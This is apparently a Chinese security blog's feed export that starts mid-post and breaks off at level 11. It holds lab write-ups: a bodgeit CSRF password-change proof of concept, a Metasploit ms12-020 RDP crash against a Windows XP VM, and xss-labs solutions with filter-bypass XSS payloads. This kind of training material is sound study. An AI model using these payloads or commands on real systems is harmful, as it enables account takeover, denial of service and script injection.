href="mailto:&#116;&#x65;&#115;&#x74;&#x40;&#116;&#104;&#101;&#98;&#111;&#x64;&#103;&#101;&#105;&#x74;&#115;&#x74;&#x6f;&#x72;&#101;&#46;&#x63;&#111;&#x6d;">&#116;&#x65;&#115;&#x74;&#x40;&#116;&#104;&#101;&#98;&#111;&#x64;&#103;&#101;&#105;&#x74;&#115;&#x74;&#x6f;&#x72;&#101;&#46;&#x63;&#111;&#x6d;</a>，在修改密码界面，修改密码：</p><img src="/posts/1d0a/6.png" class><p>提交并使用burp抓包，然后选择在burp中右键选择相关工具的CSRF PoC生成：</p><img src="/posts/1d0a/6_2.png" class><p>把POST改为GET:</p><img src="/posts/1d0a/6_3.png" class><p>然后选择用浏览器测试，复制地址：</p><img src="/posts/1d0a/6_4.png" class><p>将复制的地址，先放到浏览器，然后登录另一个账号<a href="mailto:&#x75;&#115;&#x65;&#x72;&#49;&#x40;&#x74;&#104;&#x65;&#x62;&#x6f;&#100;&#x67;&#x65;&#x69;&#x74;&#115;&#116;&#x6f;&#114;&#x65;&#46;&#99;&#111;&#109;">&#x75;&#115;&#x65;&#x72;&#49;&#x40;&#x74;&#104;&#x65;&#x62;&#x6f;&#100;&#x67;&#x65;&#x69;&#x74;&#115;&#116;&#x6f;&#114;&#x65;&#46;&#99;&#111;&#109;</a>，此时点击刚刚生成的地址，会发现user1的密码被修改了。</p><img src="/posts/1d0a/6_5.png" class>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bodgeit </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ms12-020-导致对方蓝屏</title>
      <link href="/posts/12eb.html"/>
      <url>/posts/12eb.html</url>
      
        <content type="html"><![CDATA[<p>本篇文章介绍关于msfconsole模块中ms12-020漏洞的解析。</p><span id="more"></span><h1 id="实验背景："><a href="#实验背景：" class="headerlink" title="实验背景："></a>实验背景：</h1><p>都是在虚拟机下进行的啦，靶机采用的是winxpens3，确保所用的靶机有相关的漏洞才能攻击成功哦。并且攻击机和靶机要处在同一局域网下才行哒，建议开启仅主机模式哦。还有一点，有些命令无效，可能是因为模式为普通用户模式，在命令前面使用sudo就好了，或者切换为root（su root)</p><h1 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h1><p>攻击机：kali ip地址：192.168.127.139</p><p>靶机：winxpens3 ip地址：192.168.127.138</p><h1 id="ms12-020（导致对方蓝屏）"><a href="#ms12-020（导致对方蓝屏）" class="headerlink" title="ms12-020（导致对方蓝屏）"></a>ms12-020（导致对方蓝屏）</h1><h2 id="1、配置命令"><a href="#1、配置命令" class="headerlink" title="1、配置命令"></a>1、配置命令</h2><p>确定靶机的3389端口打开</p><p>进入msfconsole，配置如下命令：</p><pre class="line-numbers language-bash"><code class="language-bash">search ms12-020   <span class="token comment" spellcheck="true">#查找ms12-020漏洞</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看信息，使用如下，这里因为0已经被修复，所以这里只能使用关于1的，不能使用use 0</p><img src="/posts/12eb/10.png" class><pre class="line-numbers language-bash"><code class="language-bash">use 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用如下，</p><pre class="line-numbers language-bash"><code class="language-bash">use auxiliary/dos/windows/rdp/ms12_020_maxchannelids<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择之后，发现提示信息，按照提示信息配置：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> payload linux/x64/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/12eb/11.png" class><p>然后查看并配置所需命令：</p><pre class="line-numbers language-bash"><code class="language-bash">show options<span class="token keyword">set</span> RHOSTS 192.168.127.138    <span class="token comment" spellcheck="true">#配置靶机地址</span><span class="token keyword">set</span> LHOST 192.168.127.139     <span class="token comment" spellcheck="true">#配置攻击机地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、运行攻击"><a href="#2、运行攻击" class="headerlink" title="2、运行攻击"></a>2、运行攻击</h2><p>完成前面的配置之后，运行：</p><pre class="line-numbers language-bash"><code class="language-bash">run       <span class="token comment" spellcheck="true">#或者使用exploit,来实现攻击</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/12eb/12.png" class><p>查看到出现seems down 表示攻击成功，已经致使目标机蓝屏了。</p><img src="/posts/12eb/13.png" class>]]></content>
      
      
      <categories>
          
          <category> msfconsole </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> msfconsole </tag>
            
            <tag> 攻击 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-labs题解</title>
      <link href="/posts/84ce.html"/>
      <url>/posts/84ce.html</url>
      
        <content type="html"><![CDATA[<p>前些时间把xss-labs的靶场练习了一下，其实如果想练习靶场的话，可以是从xss先开始的，sqli练习的我还停留在第四关。xss总共20关，还是好理解一点的，下面是我的一些理解。</p><span id="more"></span><h1 id="基本流程："><a href="#基本流程：" class="headerlink" title="基本流程："></a>基本流程：</h1><p>先输入一个payload，然后查看网页源码，先猜想一下，再去查看原php文件，验证猜想或者找到解题的关键。</p><p>提供一个直接查看源码的快捷方式：ctrl+U,</p><p>或者直接在网址前面输入view-source:   （一样的意思）我个人还是喜欢直接按ctrl+U的方式，比较方便。</p><h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>可以先查看第一关的源码，发现直接将值传递过去了</p><p>在level1.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接将键盘的值传送给了后台</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试:"></a>尝试:</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现没有成功，查看一下源码：</p><img src="/posts/84ce/2.png" class>png)<p>&lt;和&gt;都被编码成了html字符实体。</p><p>在level2.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>'<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>htmlspecialchars()函数对变量str进行处理之后显示到网页上。(即将&lt;和&gt;都被编码成了html字符实体）但value中并没有使用。</p><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php">"<span class="token operator">></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 闭合前面的，注释后面的。</p><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><h2 id="尝试："><a href="#尝试：" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现没有成功，查看一下源码：</p><img src="/posts/84ce/3.png" class><p>在level3.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>"<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span><span class="token punctuation">"</span>.htmlspecialchars($str).<span class="token punctuation">"</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>两处都使用了htmlspecialchars()函数，就不能使用带有&lt;或&gt;</p><h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token string">'onfocus=javascript:alert('</span>xss'<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在使用之后，当使用鼠标点击该输入框时输入框被选中可以。</p><h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><h2 id="尝试：-1"><a href="#尝试：-1" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现没有成功，查看一下源码：</p><img src="/posts/84ce/4.png" class><p>在level4.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#将变量中的>删除</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token shell-comment comment">#将变量中的&lt;删除</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>不能使用带有&lt;或&gt;,还是可以使用第三关的题解。</p><h2 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token string">'onfocus=javascript:alert('</span>xss'<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在使用之后，当使用鼠标点击该输入框时输入框被选中可以。</p><h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><h2 id="尝试1："><a href="#尝试1：" class="headerlink" title="尝试1："></a>尝试1：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现没有成功，查看一下源码：</p><img src="/posts/84ce/5.png" class><h2 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h2><pre class="line-numbers language-php"><code class="language-php">onfocus<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现也未成功，查看一下源码：</p><img src="/posts/84ce/5_2.png" class><p>在level5.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token shell-comment comment">#将值进行全小写的转换，然后赋值给str变量。</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过str_replace()函数来破坏变量值中的敏感字符的语义。</p><p>不能用带有script和on的payload</p><h2 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php">"<span class="token operator">></span><span class="token markup">&lt;a href=javascript:alert('xss')></span>xss<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><h2 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="尝试2-1"><a href="#尝试2-1" class="headerlink" title="尝试2"></a>尝试2</h2><pre class="line-numbers language-php"><code class="language-php">onfocus<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="尝试3"><a href="#尝试3" class="headerlink" title="尝试3"></a>尝试3</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup">&lt;a href=javascript:alert('xss')></span>xss<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源码，错误原因和level 5一样</p><p>在level6.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不能使用以上字符，但没转化成小写，因此可以利用大小写混写来绕过</p><h2 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php">"<span class="token operator">></span><span class="token markup">&lt;a HrEf=javascript:alert('xss')></span>xss<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其他的大小写混写一样也可以</p><h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><h2 id="尝试：-2"><a href="#尝试：-2" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看网页源码：</p><img src="/posts/84ce/7.png" class><p>尝试其他的语句，也是出现这种情况</p><p>在level7.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span><span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token shell-comment comment">#将参数值转换成小写</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token shell-comment comment">#将基本的关键词都删掉</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时可使用双写关键字，</p><h2 id="payload-6"><a href="#payload-6" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php">"oonnfocus<span class="token operator">=</span>javascriscriptpt<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其实就是只要关键字”on” “script”等包含在那个里面，它删掉一个之后，还会保留一个，就可以实现绕过</p><h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><h2 id="尝试1：-1"><a href="#尝试1：-1" class="headerlink" title="尝试1："></a>尝试1：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>网页源码为：</p><img src="/posts/84ce/8.png" class><h2 id="尝试2-2"><a href="#尝试2-2" class="headerlink" title="尝试2:"></a>尝试2:</h2><pre class="line-numbers language-php"><code class="language-php">javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看网页源码发现破坏了语义：</p><img src="/posts/84ce/8_2.png" class><p>在level8.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token shell-comment comment">#将参数值转换成小写</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">"scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str7</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="payload-7"><a href="#payload-7" class="headerlink" title="payload:"></a>payload:</h2><p>将unicode编码转换成ASCII码，即将javascript:alert(‘xss’)转换成ASCII码即可</p><h1 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h1><h2 id="尝试：-3"><a href="#尝试：-3" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看网页源代码，推测要按照他的某个格式来</p><img src="/posts/84ce/9.png" class><p>在leve9.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token operator">===</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str7</span><span class="token punctuation">,</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//'))   #判断如果字符中没有http://的话就会返回false，</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="payload-8"><a href="#payload-8" class="headerlink" title="payload:"></a>payload:</h2><p>跟level 8差不多，先将unicode编码转换成ASCII码，即将javascript:alert(‘xss’)转换成ASCII码，再在后面加一个真正的网址，如//<a href="http://www.baidu.com/">http://www.baidu.com</a>  </p><h1 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h1><h2 id="尝试：-4"><a href="#尝试：-4" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源代码，发现有三个隐藏的表单</p><img src="/posts/84ce/10.png" class><p>分别测试，发现只有t-sort可以写进值（在f12下调试，将表单的type=”hidden”改成type=”text”，再给value取值)</p><h2 id="payload-9"><a href="#payload-9" class="headerlink" title="payload:"></a>payload:</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token operator">&amp;</span>t_sort<span class="token operator">=</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前面的keyword的值不重要，后面的t_sort等于后面的”是闭合value的”</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>在控制台中，将值直接添加在其中:</p><img src="/posts/84ce/10_2.png" class><h1 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h1><h2 id="尝试：-5"><a href="#尝试：-5" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" 